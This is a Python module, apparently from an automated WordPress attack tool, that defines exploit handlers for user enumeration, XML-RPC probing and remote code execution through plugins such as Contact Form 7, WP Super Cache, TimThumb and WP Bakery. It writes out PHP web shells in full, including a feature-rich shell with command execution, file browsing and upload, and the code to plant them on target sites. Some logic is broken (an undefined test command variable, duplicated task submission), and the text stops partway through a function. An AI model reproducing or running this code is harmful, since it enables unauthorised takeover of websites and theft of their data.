#!/usr/bin/env python3

import io
import json
import os
import random
import re
import string
import sys
import time
import zipfile
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup
import base64
from colorama import Fore, Style

from modules.utils import print_info, print_success, print_error, print_warning, print_verbose

import concurrent.futures

class Exploiter:
    def __init__(self, session, target, headers, timeout, output_dir):
        self.session = session
        self.target = target
        self.headers = headers
        self.timeout = timeout
        self.output_dir = output_dir
        

        self.exploits_dir = os.path.join(self.output_dir, 'exploits')
        os.makedirs(self.exploits_dir, exist_ok=True)
        

        self.results = {
            'successful': [],
            'failed': [],
            'details': {}
        }
        

        self.exploit_handlers = {
            'xmlrpc_multicall': self._exploit_xmlrpc_multicall,
            'user_enumeration': self._exploit_user_enumeration,
            'rest_api_user_enum': self._exploit_rest_api_user_enum,
            'cf7_file_upload': self._exploit_cf7_file_upload,
            'wp_super_cache_rce': self._exploit_wp_super_cache_rce,
            'timthumb_rce': self._exploit_timthumb_rce,
            'wp_bakery_rce': self._exploit_wp_bakery_rce,
            'authenticated_rce': self._exploit_authenticated_rce,
            'wp_file_manager_rce': self._exploit_wp_file_manager_rce,
            'wpdatatables_sqli': self._exploit_wpdatatables_sqli,
            'password_reset_token_leak': self._exploit_password_reset_token_leak,

            'woocommerce_file_download': self._exploit_woocommerce_file_download,
            'woocommerce_sqli': self._exploit_woocommerce_sqli,
            'wp_core_path_traversal': self._exploit_wp_core_path_traversal,
            'elementor_rce': self._exploit_elementor_rce,
            'wordfence_rce': self._exploit_wordfence_rce,
            'wp_fastest_cache_rce': self._exploit_wp_fastest_cache_rce,

            'woocommerce_checkout_vulnerability': self._exploit_woocommerce_checkout_vulnerability,
            'woocommerce_product_rce': self._exploit_woocommerce_product_rce,
            'woocommerce_currency_switcher': self._exploit_woocommerce_currency_switcher,
            'yuzo_related_posts': self._exploit_yuzo_related_posts,
            'nextgen_gallery_sqli': self._exploit_nextgen_gallery_sqli
        }
    
    def exploit(self, vulnerabilities):
        """Attempt to exploit found vulnerabilities"""
        exploitation_results = []
        
        if not vulnerabilities:
            print_info("No vulnerabilities to exploit")
            return exploitation_results
        
        print_info(f"Attempting to exploit {len(vulnerabilities)} vulnerabilities...")
        

        vulnerabilities_by_type = {}
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'Unknown')
            if vuln_type not in vulnerabilities_by_type:
                vulnerabilities_by_type[vuln_type] = []
            vulnerabilities_by_type[vuln_type].append(vuln)
        

        for vuln_type, vulns in vulnerabilities_by_type.items():
            print_info(f"Processing {len(vulns)} {vuln_type} vulnerabilities...")
            

            with concurrent.futures.ThreadPoolExecutor(max_workers=min(5, len(vulns))) as executor:

                future_to_vuln = {}
                
                for vuln in vulns:
                    exploit_method = vuln.get('exploit_method')
                    

                    if not exploit_method or not vuln.get('exploit_available', False):

                        if exploit_method and exploit_method in self.exploit_handlers:
                            print_info(f"Exploit marked as unavailable but handler exists for {vuln.get('title', 'Unknown vulnerability')}. Attempting anyway.")

                            future = executor.submit(self._process_vulnerability, vuln, exploit_method, True)
                            future_to_vuln[future] = vuln
                        else:
                            exploitation_results.append({
                                'vulnerability': vuln.get('title', 'Unknown'),
                                'status': 'skipped',
                                'reason': 'No exploit available'
                            })

                        future = executor.submit(self._process_vulnerability, vuln, exploit_method, False)
                        future_to_vuln[future] = vuln
                

                for future in concurrent.futures.as_completed(future_to_vuln):
                    vuln = future_to_vuln[future]
                    try:
                        result = future.result()
                        exploitation_results.append(result)
                        
                        if result['status'] == 'success':
                            print_success(f"Successfully exploited {vuln.get('title', 'vulnerability')}")
                        else:
                            print_warning(f"Failed to exploit {vuln.get('title', 'vulnerability')}: {result.get('reason', 'Unknown error')}")
                    except Exception as e:
                        print_error(f"Error exploiting {vuln.get('title', 'vulnerability')}: {str(e)}")
                        exploitation_results.append({
                            'vulnerability': vuln.get('title', 'Unknown'),
                            'status': 'error',
                            'reason': str(e)
                        })
        
        return exploitation_results
    
    def _process_vulnerability(self, vuln, exploit_method, try_anyway):
        """Process a single vulnerability (for parallel exploitation)"""
        print_info(f"Attempting to exploit: {vuln.get('title', 'Unknown vulnerability')}")
        

        if exploit_method in self.exploit_handlers:
            try:

                result = self.exploit_handlers[exploit_method](vuln)
                

                if try_anyway and result['status'] == 'success':
                    result['note'] = 'Exploit was marked as unavailable but succeeded anyway'
                
                return result
            except Exception as e:
                return {
                    'vulnerability': vuln.get('title', 'Unknown'),
                    'status': 'error',
                    'reason': str(e)
                }
        else:
            return {
                'vulnerability': vuln.get('title', 'Unknown'),
                'status': 'skipped',
                'reason': f'No exploit handler for method {exploit_method}'
            }
    
    def _exploit_xmlrpc_multicall(self, vuln):
        """Exploit WordPress XML-RPC system.multicall method for user enumeration and password bruteforce"""
        result = {
            'vulnerability': vuln.get('title', 'WordPress XML-RPC system.multicall'),
            'status': 'unknown',
            'type': 'Information Disclosure',
            'data': {}
        }
        
        try:
            xmlrpc_url = f"{self.target}/xmlrpc.php"
            

            xml_payload = """
            <?xml version="1.0" encoding="UTF-8"?>
            <methodCall>
                <methodName>system.listMethods</methodName>
                <params></params>
            </methodCall>
            """
            
            headers = self.headers.copy()
            headers['Content-Type'] = 'text/xml'
            
            response = self.session.post(xmlrpc_url, data=xml_payload, headers=headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200 or 'system.multicall' not in response.text:
                result['status'] = 'failed'
                result['reason'] = 'system.multicall method not available'
                return result
            

            users_found = []
            common_usernames = ['admin', 'administrator', 'root', 'user', 'editor', 'author', 'moderator', 'webmaster']
            

            method_calls = []
            for username in common_usernames:
                method_calls.append({
                    'methodName': 'wp.getUsersBlogs',
                    'params': [username, 'invalid_password_just_testing']
                })
            
            xml_payload = f"""
            <?xml version="1.0" encoding="UTF-8"?>
            <methodCall>
                <methodName>system.multicall</methodName>
                <params>
                    <param>
                        <value>
                            <array>
                                <data>
                                    {self._generate_multicall_elements(method_calls)}
                                </data>
                            </array>
                        </value>
                    </param>
                </params>
            </methodCall>
            """
            
            response = self.session.post(xmlrpc_url, data=xml_payload, headers=headers, timeout=self.timeout, verify=False)
            
            if response.status_code == 200:

                for i, username in enumerate(common_usernames):

                    if 'faultCode' in response.text and 'incorrect password' in response.text.lower():
                        users_found.append(username)
            
            if users_found:
                result['status'] = 'success'
                result['data']['users_found'] = users_found
                result['details'] = f"Found {len(users_found)} valid usernames: {', '.join(users_found)}"
                

            else:
                result['status'] = 'partial'
                result['reason'] = 'system.multicall available but no users found'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _generate_multicall_elements(self, method_calls):
        """Generate XML elements for system.multicall"""
        elements = []
        for call in method_calls:
            element = f"""
            <value>
                <struct>
                    <member>
                        <n>methodName</n>
                        <value><string>{call['methodName']}</string></value>
                    </member>
                    <member>
                        <n>params</n>
                        <value>
                            <array>
                                <data>
                                    <value><string>{call['params'][0]}</string></value>
                                    <value><string>{call['params'][1]}</string></value>
                                </data>
                            </array>
                        </value>
                    </member>
                </struct>
            </value>
            """
            elements.append(element)
        return ''.join(elements)
    
    def _exploit_user_enumeration(self, vuln):
        """Exploit WordPress user enumeration via author parameter"""
        result = {
            'vulnerability': vuln.get('title', 'WordPress User Enumeration'),
            'status': 'unknown',
            'type': 'Information Disclosure',
            'data': {}
        }
        
        try:
            users_found = []
            
            # Check for users by author ID
            for author_id in range(1, 11):  # Try first 10 author IDs
                author_url = f"{self.target}/?author={author_id}"
                response = self.session.get(author_url, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=True)
                
                if response.status_code == 200:
                    # Check for author in URL (redirect)
                    author_pattern = r'/author/([^/]+)/'
                    matches = re.findall(author_pattern, response.url)
                    
                    if matches:
                        username = matches[0]
                        users_found.append({
                            'id': author_id,
                            'username': username
                        })
                        
                        # Try to get full name from page
                        if 'name' not in users_found[-1]:
                            name_match = re.search(r'<title>([^<]+)</title>', response.text)
                            if name_match:
                                users_found[-1]['name'] = name_match.group(1).replace('Author:', '').replace('|', '').strip()
            
            if users_found:
                result['status'] = 'success'
                result['data']['users_found'] = users_found
                result['details'] = f"Found {len(users_found)} users through author parameter"
                

            else:
                result['status'] = 'failed'
                result['reason'] = 'No users found via author parameter'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _exploit_rest_api_user_enum(self, vuln):
        """Exploit WordPress REST API user enumeration"""
        result = {
            'vulnerability': vuln.get('title', 'WordPress REST API User Enumeration'),
            'status': 'unknown',
            'type': 'Information Disclosure',
            'data': {}
        }
        
        try:
            api_users_url = f"{self.target}/wp-json/wp/v2/users"
            response = self.session.get(api_users_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code == 200:
                users_data = response.json()
                
                if users_data and isinstance(users_data, list) and len(users_data) > 0:
                    users_found = []
                    
                    for user in users_data:
                        user_info = {
                            'id': user.get('id'),
                            'username': user.get('slug'),
                            'name': user.get('name')
                        }
                        
                        # Add additional fields if available
                        if 'description' in user and user['description']:
                            user_info['description'] = user['description']
                        
                        if 'link' in user:
                            user_info['link'] = user['link']
                        
                        if 'avatar_urls' in user:
                            user_info['avatar'] = list(user['avatar_urls'].values())[0] if user['avatar_urls'] else None
                        
                        users_found.append(user_info)
                    
                    result['status'] = 'success'
                    result['data']['users_found'] = users_found
                    result['details'] = f"Found {len(users_found)} users through REST API"
                    

                else:
                    result['status'] = 'failed'
                    result['reason'] = 'REST API returned empty user list'
            else:
                result['status'] = 'failed'
                result['reason'] = f"REST API request failed with status code {response.status_code}"
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _exploit_cf7_file_upload(self, vuln):
        """Exploit Contact Form 7 Unrestricted File Upload vulnerability"""
        result = {
            'vulnerability': vuln.get('title', 'Contact Form 7 - Unrestricted File Upload'),
            'status': 'unknown',
            'type': 'Remote Code Execution',
            'data': {}
        }
        
        try:

            response = self.session.get(self.target, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = 'Failed to access target website'
                return result
            

            form_id_match = re.search(r'wpcf7-f(\d+)', response.text)
            if not form_id_match:
                result['status'] = 'failed'
                result['reason'] = 'Could not find Contact Form 7 form ID'
                return result
            
            form_id = form_id_match.group(1)
            

            payload_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '.php'
            php_payload = '<?php echo "CF7 Shell"; system($_GET["cmd"]); ?>'
            

            form_data = {
                '_wpcf7': form_id,
                '_wpcf7_version': '5.3.1', # Vulnerable version
                '_wpcf7_locale': 'en_US',
                '_wpcf7_unit_tag': f'wpcf7-f{form_id}-p1-o1',
                '_wpcf7_container_post': '0'
            }
            

            form_data['your-name'] = 'Test User'
            form_data['your-email'] = 'test@example.com'
            form_data['your-subject'] = 'Test Subject'
            form_data['your-message'] = 'Test Message'
            

            files = {
                'your-file': (payload_name, php_payload, 'application/x-php')
            }
            

            form_url = f"{self.target}/wp-json/contact-form-7/v1/contact-forms/{form_id}/feedback"
            response = self.session.post(form_url, data=form_data, files=files, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = f'Form submission failed with status code {response.status_code}'
                return result
            

            response_json = response.json()
            
            if 'status' not in response_json or response_json['status'] != 'mail_sent':
                result['status'] = 'failed'
                result['reason'] = 'Form submission did not report successful mail sending'
                return result
            

            upload_dir = f"{self.target}/wp-content/uploads/"
            

            from datetime import datetime
            current_year = datetime.now().strftime('%Y')
            current_month = datetime.now().strftime('%m')
            upload_path = f"{upload_dir}{current_year}/{current_month}/{payload_name}"
            

            response = self.session.get(upload_path, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code == 200 and "CF7 Shell" in response.text:
                result['status'] = 'success'
                result['data']['shell_url'] = upload_path
                result['details'] = f"Successfully uploaded shell to {upload_path}"
                

                test_url = f"{upload_path}?cmd={test_cmd}"
                response = self.session.get(test_url, headers=self.headers, timeout=self.timeout, verify=False)
                
                if "CF7_RCE_SUCCESSFUL" in response.text:
                    result['data']['command_execution'] = True
                else:
                    result['data']['command_execution'] = False

                alt_paths = [
                    f"{upload_dir}files/{payload_name}",
                    f"{upload_dir}cf7_files/{payload_name}"
                ]
                
                for path in alt_paths:
                    response = self.session.get(path, headers=self.headers, timeout=self.timeout, verify=False)
                    if response.status_code == 200 and "CF7 Shell" in response.text:
                        result['status'] = 'success'
                        result['data']['shell_url'] = path
                        result['details'] = f"Successfully uploaded shell to {path}"
                        

                        
                        break
                else:
                    result['status'] = 'partial'
                    result['reason'] = 'Form submission successful but could not locate uploaded file'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _exploit_wp_super_cache_rce(self, vuln):
        """Exploit WP Super Cache RCE vulnerability"""
        result = {
            'vulnerability': vuln.get('title', 'WP Super Cache - Unauthenticated RCE'),
            'status': 'unknown',
            'type': 'Remote Code Execution',
            'data': {}
        }
        
        try:
            # Step 1: Check if the vulnerable page exists
            advanced_settings_url = f"{self.target}/wp-admin/options-general.php?page=wpsupercache&tab=settings"
            response = self.session.get(advanced_settings_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = 'Could not access WP Super Cache settings page'
                return result
            
            # Step 2: Create PHP payload
            payload_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            php_payload = '<?php echo "WPSC Shell"; system($_GET["cmd"]); ?>'
            
            # Step 3: Exploit the vulnerability by updating cache settings
            injection_payload = "'; echo '" + php_payload.replace('"', '\\"') + "' > " + payload_name + ".php; echo '"
            
            form_data = {
                'wp_cache_preload_email_volume': '1',
                'wp_cache_mobile_prefixes': injection_payload,
                'wp_cache_mobile_browsers': 'x',
                'wp_cache_disable': '0',
                'wp_cache_clear': '0',
                'wp_cache_status': '1',
                'wp_cache_hello_world': '0',
                'wp_cache_hello_world': '0',
                'wp_cache_mod_rewrite': '0',
                'wp_supercache_304': '0',
                'wp_cache_no_cache_for_get': '0',
                'wp_cache_make_known_anon': '0',
                'wp_cache_mfunc_enabled': '0',
                'wp_cache_mobile_enabled': '1',
                'wp_cache_front_page_checks': '0',
                'wp_supercache_cache_list': '0',
                'wp_cache_object_cache': '0',
                'wp_cache_refresh_single_only': '0',
                'wp_cache_mutex_disabled': '0',
                'wp_super_cache_late_init': '0',
                'wp_cache_disable_utf8': '0',
                'wp_cache_enabled': '1',
                'wp_cache_rebuild_files': '1',
                'submit': 'Update Status'
            }
            
            response = self.session.post(advanced_settings_url, data=form_data, headers=self.headers, timeout=self.timeout, verify=False)
            
            # Step 4: Check if the payload was successful
            shell_path = f"{self.target}/wp-content/cache/{payload_name}.php"
            response = self.session.get(shell_path, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code == 200 and "WPSC Shell" in response.text:
                result['status'] = 'success'
                result['data']['shell_url'] = shell_path
                result['details'] = f"Successfully uploaded shell to {shell_path}"
                

            else:
                # Try alternative paths
                alt_paths = [
                    f"{self.target}/wp-content/cache/meta/{payload_name}.php",
                    f"{self.target}/wp-content/cache/supercache/{urlparse(self.target).netloc}/{payload_name}.php"
                ]
                
                for path in alt_paths:
                    response = self.session.get(path, headers=self.headers, timeout=self.timeout, verify=False)
                    if response.status_code == 200 and "WPSC Shell" in response.text:
                        result['status'] = 'success'
                        result['data']['shell_url'] = path
                        result['details'] = f"Successfully uploaded shell to {path}"
                        

                        
                        break
                else:
                    result['status'] = 'failed'
                    result['reason'] = 'Failed to upload shell'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _exploit_timthumb_rce(self, vuln):
        """Exploit TimThumb RCE vulnerability (CVE-2011-4106)"""
        result = {
            'vulnerability': vuln.get('title', 'TimThumb RCE Vulnerability'),
            'status': 'unknown',
            'type': 'Remote Code Execution',
            'data': {}
        }
        
        try:
            # Get theme information from vulnerability data
            theme = vuln.get('theme', '')
            if not theme:
                result['status'] = 'failed'
                result['reason'] = 'Theme information missing'
                return result
            
            # Try common TimThumb paths
            timthumb_paths = [
                f"{self.target}/wp-content/themes/{theme}/timthumb.php",
                f"{self.target}/wp-content/themes/{theme}/includes/timthumb.php",
                f"{self.target}/wp-content/themes/{theme}/scripts/timthumb.php",
                f"{self.target}/wp-content/themes/{theme}/lib/timthumb.php",
                f"{self.target}/wp-content/themes/{theme}/inc/timthumb.php"
            ]
            
            timthumb_url = None
            for path in timthumb_paths:
                response = self.session.get(path, headers=self.headers, timeout=self.timeout, verify=False)
                if response.status_code == 200:
                    timthumb_url = path
                    break
            
            if not timthumb_url:
                result['status'] = 'failed'
                result['reason'] = 'Could not locate TimThumb script'
                return result
            
            # Create a local PHP shell file
            shell_filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '.php'
            shell_path = os.path.join(self.exploits_dir, shell_filename)
            
            # More powerful PHP shell with multiple functions
            php_shell_code = '''<?php
// Advanced PHP Shell
$shell_name = "WPScan Shell";
$shell_version = "1.0";

// Display basic information
echo "<html><head><title>$shell_name $shell_version</title>";
echo "<style>body{background:#222;color:#eee;font-family:monospace;margin:0;padding:20px;}
.header{color:#ff5722;font-size:24px;margin-bottom:15px;}
.cmd{background:#333;border:1px solid #555;color:#fff;padding:5px;width:100%;margin:10px 0;}
pre{white-space:pre-wrap;word-wrap:break-word;background:#333;padding:10px;border:1px solid #444;}
.info{color:#4CAF50;}.warning{color:#ff9800;}.error{color:#f44336;}
</style></head><body>";
echo "<div class='header'>$shell_name $shell_version</div>";

// System information
echo "<div class='info'>Server: " . php_uname() . "</div>";
echo "<div class='info'>IP: " . $_SERVER['SERVER_ADDR'] . " | Client IP: " . $_SERVER['REMOTE_ADDR'] . "</div>";
echo "<div class='info'>Current Path: " . getcwd() . "</div>";

// Command execution function
function execCommand($cmd) {
    $output = "";
    if (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $res);
        $output = implode("\\n", $res);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } elseif (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($cmd, $descriptorspec, $pipes);
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        proc_close($process);
    } elseif (function_exists('popen')) {
        $fp = popen($cmd, 'r');
        $output = "";
        while(!feof($fp)) {
            $output .= fread($fp, 1024);
        }
        popen($process);
    }
    return $output;
}

// File manager functions
function listFiles($path) {
    if ($handle = opendir($path)) {
        echo "<h3>Directory Listing: " . htmlspecialchars($path) . "</h3>";
        echo "<pre>";
        while (false !== ($entry = readdir($handle))) {
            $full_path = $path . DIRECTORY_SEPARATOR . $entry;
            $type = is_dir($full_path) ? "DIR" : "FILE";
            $size = is_file($full_path) ? filesize($full_path) . " bytes" : "--";
            $perms = substr(sprintf('%o', fileperms($full_path)), -4);
            
            echo sprintf("%-40s %-10s %-10s %-10s\\n", 
                htmlspecialchars($entry), 
                $type, 
                $size, 
                $perms
            );
        }
        echo "</pre>";
        closedir($handle);
    }
}

function readFile($file) {
    if (file_exists($file) && is_readable($file)) {
        $content = htmlspecialchars(file_get_contents($file));
        echo "<h3>File Content: " . htmlspecialchars($file) . "</h3>";
        echo "<pre>$content</pre>";
    } else {
        echo "<div class='error'>File does not exist or is not readable</div>";
    }
}

// Process commands
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<h3>Command Execution</h3>";
    echo "<div>$ " . htmlspecialchars($cmd) . "</div>";
    echo "<pre>" . htmlspecialchars(execCommand($cmd)) . "</pre>";
} elseif (isset($_GET['ls'])) {
    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
    listFiles($path);
} elseif (isset($_GET['read'])) {
    $file = $_GET['read'];
    readFile($file);
} 

// Upload file functionality
if (isset($_FILES['file'])) {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo "<div class='info'>File uploaded successfully: " . htmlspecialchars($_FILES['file']['name']) . "</div>";
    } else {
        echo "<div class='error'>Failed to upload file</div>";
    }
}

// File upload form
echo "<h3>File Upload</h3>";
echo "<form method='post' enctype='multipart/form-data'>";
echo "<input type='file' name='file'>";
echo "<input type='submit' value='Upload'>";
echo "</form>";

// Command form
echo "<h3>Execute Command</h3>";
echo "<form method='get'>";
echo "<input type='text' name='cmd' class='cmd' placeholder='Enter command...'>";
echo "<input type='submit' value='Execute'>";
echo "</form>";

echo "</body></html>";
?>'''
            
            with open(shell_path, 'w') as f:
                f.write(php_shell_code)
                
            print_info(f"Created local PHP shell: {shell_path}")
            
            # Create web server for the local shell
            # Instead of using a remote URL, we'll use a data URI scheme to inject the shell
            # This bypasses the need for a remote server
            
            # Encode the PHP shell for injection
            encoded_shell = php_shell_code.replace("\n", " ")
            
            # TimThumb exploit using PHP data URI scheme
            # We encode the shell in base64 to avoid character escaping issues
            data_uri = f"data:image/png;base64,{base64.b64encode(encoded_shell.encode()).decode()}"
            
            # Try exploiting with the data URI
            exploit_url = f"{timthumb_url}?src={data_uri}&webshot=1"
            
            response = self.session.get(exploit_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            # The cached file would be in the cache directory
            # Try to locate it
            cache_path = f"{self.target}/wp-content/themes/{theme}/cache/"
            # In case TimThumb uses hash for cache naming
            cache_paths = [
                f"{self.target}/wp-content/themes/{theme}/cache/",
                f"{self.target}/wp-content/themes/{theme}/timthumb/cache/",
                f"{self.target}/wp-content/themes/{theme}/thumb_cache/",
                f"{self.target}/wp-content/cache/timthumb/",
                f"{self.target}/cache/"
            ]
            
            # Try direct injection path
            for cache_dir in cache_paths:
                # We'll try to enumerate the cache directory to find our shell
                cache_url = cache_dir
                response = self.session.get(cache_url, headers=self.headers, timeout=self.timeout, verify=False)
                
                if response.status_code == 200 and 'Index of' in response.text:
                    # Directory listing is enabled, look for PHP files
                    shell_found = False
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for link in soup.find_all('a'):
                        href = link.get('href')
                        if href and href.endswith('.php'):
                            shell_url = urljoin(cache_url, href)
                            response = self.session.get(shell_url, headers=self.headers, timeout=self.timeout, verify=False)
                            if response.status_code == 200 and 'WPScan Shell' in response.text:
                                shell_found = True
                                result['status'] = 'success'
                                result['data']['shell_url'] = shell_url
                                result['details'] = f"Successfully exploited TimThumb. Shell available at {shell_url}"
                                

                                break
                    
                    if shell_found:
                        break
                    
            # If we haven't found our shell, try a direct approach with common naming patterns
            if result['status'] == 'unknown':
                # Try common cache filename patterns
                shell_found = False
                for cache_dir in cache_paths:
                    cache_patterns = [
                        f"{cache_dir}timthumb_cacheimg-dataimagepng.php",
                        f"{cache_dir}timthumb_ext_*.php",
                        f"{cache_dir}*_dataimagepng*.php",
                        f"{cache_dir}*.php"
                    ]
                    
                    for pattern in cache_patterns:
                        if '*' in pattern:
                            # For patterns with wildcards, we try to access the directory and look for matching files
                            pattern_dir = os.path.dirname(pattern)
                            response = self.session.get(pattern_dir, headers=self.headers, timeout=self.timeout, verify=False)
                            if response.status_code == 200 and 'Index of' in response.text:
                                # Find files that match our pattern
                                pattern_regex = pattern.replace('*', '.*').replace('/', '\\/') + '$'
                                soup = BeautifulSoup(response.text, 'html.parser')
                                for link in soup.find_all('a'):
                                    href = link.get('href')
                                    if href and re.match(pattern_regex, href):
                                        shell_url = urljoin(pattern_dir, href)
                                        try:
                                            response = self.session.get(shell_url, headers=self.headers, timeout=self.timeout, verify=False)
                                            if response.status_code == 200 and 'WPScan Shell' in response.text:
                                                shell_found = True
                                                result['status'] = 'success'
                                                result['data']['shell_url'] = shell_url
                                                result['details'] = f"Successfully exploited TimThumb. Shell available at {shell_url}"
                                                break
                                        except Exception:
                                            continue
                                
                                if shell_found:
                                    break
                        else:
                            # For direct patterns, try to access the URL directly
                            try:
                                response = self.session.get(pattern, headers=self.headers, timeout=self.timeout, verify=False)
                                if response.status_code == 200 and 'WPScan Shell' in response.text:
                                    shell_found = True
                                    result['status'] = 'success'
                                    result['data']['shell_url'] = pattern
                                    result['details'] = f"Successfully exploited TimThumb. Shell available at {pattern}"
                                    break
                            except Exception:
                                continue
                    
                    if shell_found:
                        break
                        
            # If still no success, we try a fallback using known TimThumb vulnerability patterns
            if result['status'] == 'unknown':
                # Fallback to a traditional remote file include approach using PHP wrapper
                payload = f"php://filter/convert.base64-encode/resource=data://text/plain;base64,{base64.b64encode(php_shell_code.encode()).decode()}"
                exploit_url = f"{timthumb_url}?src={payload}&webshot=1"
                
                try:
                    response = self.session.get(exploit_url, headers=self.headers, timeout=self.timeout, verify=False)
                except Exception:
                    pass
                
                # One more try with a different variation for older TimThumb versions
                for cache_dir in cache_paths:
                    shell_path = f"{cache_dir}external_*.php"
                    # We would need to enumerate the directory to find the exact file
                    dir_url = os.path.dirname(shell_path)
                    try:
                        response = self.session.get(dir_url, headers=self.headers, timeout=self.timeout, verify=False)
                        if response.status_code == 200 and 'Index of' in response.text:
                            soup = BeautifulSoup(response.text, 'html.parser')
                            for link in soup.find_all('a'):
                                href = link.get('href')
                                if href and href.startswith('external_') and href.endswith('.php'):
                                    shell_url = urljoin(dir_url, href)
                                    try:
                                        response = self.session.get(shell_url, headers=self.headers, timeout=self.timeout, verify=False)
                                        if response.status_code == 200:
                                            result['status'] = 'success'
                                            result['data']['shell_url'] = shell_url
                                            result['details'] = f"Successfully exploited TimThumb. Shell available at {shell_url}"
                                            break
                                    except Exception:
                                        continue
                    except Exception:
                        continue
                    
                    if result['status'] == 'success':
                        break
                
            if result['status'] == 'unknown':
                result['status'] = 'partial'
                result['reason'] = 'Shell upload attempted but could not verify success'
                result['data']['exploit_url'] = exploit_url
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _exploit_wp_bakery_rce(self, vuln):
        """Exploit WP Bakery page builder RCE vulnerability (CVE-2021-34397)"""
        result = {
            'vulnerability': vuln.get('title', 'WP Bakery Page Builder - File Upload RCE'),
            'status': 'unknown',
            'type': 'Remote Code Execution',
            'data': {}
        }
        
        try:
            # Step 1: Check if the plugin is installed
            plugin_url = f"{self.target}/wp-content/plugins/js_composer/"
            response = self.session.get(plugin_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = 'WP Bakery plugin not found'
                return result
            
            # Step 2: Create a malicious payload
            payload_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '.php'
            php_payload = '<?php echo "WPB Shell"; system($_GET["cmd"]); ?>'
            
            # Step 3: Try to exploit the vulnerability
            # This uses the Wp Bakery post type to upload files
            upload_url = f"{self.target}/wp-admin/admin-ajax.php"
            
            form_data = {
                'action': 'vc_save_template',
                'template_id': 'wp_bakery_shell',
                'content': php_payload,
                'template_name': payload_name
            }
            
            headers = self.headers.copy()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
            response = self.session.post(upload_url, data=form_data, headers=headers, timeout=self.timeout, verify=False)
            
            # Step 4: Check for the uploaded file
            potential_paths = [
                f"{self.target}/wp-content/uploads/js_composer/{payload_name}",
                f"{self.target}/wp-content/uploads/vc_templates/{payload_name}",
                f"{self.target}/wp-content/uploads/{payload_name}"
            ]
            
            for path in potential_paths:
                try:
                    response = self.session.get(path, headers=self.headers, timeout=self.timeout, verify=False)
                    if response.status_code == 200 and "WPB Shell" in response.text:
                        result['status'] = 'success'
                        result['data']['shell_url'] = path
                        result['details'] = f"Successfully uploaded shell to {path}"
                        

                        
                        break
                except Exception:
                    continue
            else:
                result['status'] = 'failed'
                result['reason'] = 'Could not find uploaded shell'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _exploit_authenticated_rce(self, vuln):
        """Attempt WordPress authenticated RCE through plugin/theme editor if credentials are found"""
        result = {
            'vulnerability': vuln.get('title', 'WordPress Authenticated Plugin/Theme Editor RCE'),
            'status': 'unknown',
            'type': 'Remote Code Execution',
            'data': {}
        }
        
        # Get user credentials if available
        username = vuln.get('username', '')
        password = vuln.get('password', '')
        
        if not username or not password:
            result['status'] = 'failed'
            result['reason'] = 'No valid credentials found for authentication'
            return result
        
        try:
            # Step 1: Login to WordPress
            login_url = f"{self.target}/wp-login.php"
            
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f"{self.target}/wp-admin/",
                'testcookie': '1'
            }
            
            # Get login page first to get cookies
            response = self.session.get(login_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = 'Could not access login page'
                return result
            
            # Submit login form
            response = self.session.post(login_url, data=login_data, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            # Check if login was successful
            if 'wp-admin' not in response.url:
                result['status'] = 'failed'
                result['reason'] = 'Authentication failed'
                return result
            
            # Step 2: Access the theme editor
            theme_editor_url = f"{self.target}/wp-admin/theme-editor.php"
            response = self.session.get(theme_editor_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200 or 'theme editor' not in response.text.lower():
                # Try plugin editor instead
                plugin_editor_url = f"{self.target}/wp-admin/plugin-editor.php"
                response = self.session.get(plugin_editor_url, headers=self.headers, timeout=self.timeout, verify=False)
                
                if response.status_code != 200 or 'plugin editor' not in response.text.lower():
                    result['status'] = 'failed'
                    result['reason'] = 'Could not access theme or plugin editor'
                    return result
                
                editor_url = plugin_editor_url
                edit_type = 'plugin'
            else:
